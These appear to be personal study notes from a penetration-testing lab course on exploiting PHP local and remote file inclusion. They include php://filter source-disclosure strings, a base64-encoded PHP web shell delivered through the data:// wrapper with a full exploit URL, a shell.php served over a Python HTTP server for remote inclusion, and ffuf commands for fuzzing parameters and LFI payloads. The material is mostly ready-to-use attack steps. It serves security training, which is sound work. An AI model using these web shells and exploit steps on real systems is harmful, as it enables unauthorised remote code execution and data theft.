# PHP Filters

## Input Filters

[PHP Filters](https://www.php.net/manual/en/filters.php) are a type of PHP wrapper, where we can pass different types of input and have it filtered by the filter we specify. To use PHP wrapper streams, we can use the `php://` scheme in our string, and we can access the PHP filter wrapper with `php://filter/`.

There are four different types of filters available for use, which are [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php). You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the `convert.base64-encode` filter, under `Conversion Filters`.

## Fuzzing for PHP Files

The first step would be to fuzz for different available PHP pages with a tool like `ffuf` or `gobuster`.

**Tip:** Unlike normal web application usage, we are `not restricted` to pages with HTTP response code 200, as we have `local file inclusion access`, so we should be scanning for all codes, including `301`, `302` and `403` pages, and we should be able to read their source code as well.

## Source Code Disclosure

Once we have a list of potential PHP files we want to read, we can start disclosing their sources with the `base64` PHP filter.

```
php://filter/read=convert.base64-encode/resource=config
```

# RCE : PHP Wrappers

```bash
akhmadkun@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Now, we can URL encode the base64 string, and then pass it to the data wrapper with `data://text/plain;base64,`.

```
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D
```

```bash
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```
# RCE : Remote File Inclusion

## Verify RFI

In most languages, including remote URLs is considered as a dangerous practice as it may allow for such vulnerabilities. This is why remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled.

So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to `try and include a URL`, and see if we can get its content. At first, `we should always start by trying to include a local URL (http://127.0.0.1:80/index.php)` to ensure our attempt does not get blocked by a firewall or other security measures. 

![](images/Pasted%20image%2020260103111943.png)

## Remote Code Execution with RFI

```bash
$ echo '<?php system("id"); system($_GET[0]); ?>' > shell.php
sudo python3 -m http.server 4444
```

![](images/Pasted%20image%2020260103112422.png)

We may also host our script through FTP/SMB protocol

# Automated Scanning

## Fuzzing Parameters

The HTML forms users can use on the web application front-end tend to be properly tested and well secured against different web attacks. However, in many cases, the page may have other exposed parameters that are not linked to any HTML forms, and hence normal users would never access or unintentionally cause harm through. This is why it may be important to fuzz for `exposed parameters`, as they tend not to be as secure as public ones.

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

```bash
❯ ffuf -u http://83.136.255.53:35210/?FUZZ=hehe -w ~/seclists/Discovery/Web-Content/burp-parameter-names.txt -ic -c -t 200

16                      [Status: 200, Size: 2309, Words: 571, Lines: 56, Duration: 168ms]
12                      [Status: 200, Size: 2309, Words: 571, Lines: 56, Duration: 167ms]
2                       [Status: 200, Size: 2309, Words: 571, Lines: 56, Duration: 167ms]
```

```bash
❯ ffuf -u http://83.136.255.53:35210/?FUZZ=hehe -w ~/seclists/Discovery/Web-Content/burp-parameter-names.txt -ic -c -t 200 -fs 2309
```


## LFI Wordlists

In many cases, we may want to run a quick test on a parameter to see if it is vulnerable to any common LFI payload, which may save us time in web applications where we need to test for various vulnerabilities.

A good wordlist is [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), as it contains various bypasses and common files, so it makes it easy to run several tests at once.

```bash
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287

...SNIP...
```

## Fuzzing Server Files

```
c:\inetpub\wwwroot\
c:\xampp\htdocs\
c:\wamp\www
```

```
var/www/html/
var/www/
var/www/sites/
var/www/public/
var/www/public_html/
var/www/html/default/
srv/www/
srv/www/html/
srv/www/sites/
home/www/
home/httpd/
home/$USER/public_html/
home/$USER/www/
```

## Server Logs/Configurations

We need to be able to identify the correct logs directory to be able to perform the log poisoning attacks we discussed. Furthermore, as we just discussed, we may also need to read the server configurations to be able to identify the server webroot path and other important information (like the logs path!).

To do so, we may also use the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, as it contains many of the server logs and configuration paths we may be interested in. If we wanted a more precise scan, we can use this [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows), though they are not part of `seclists`, so we need to download them first.

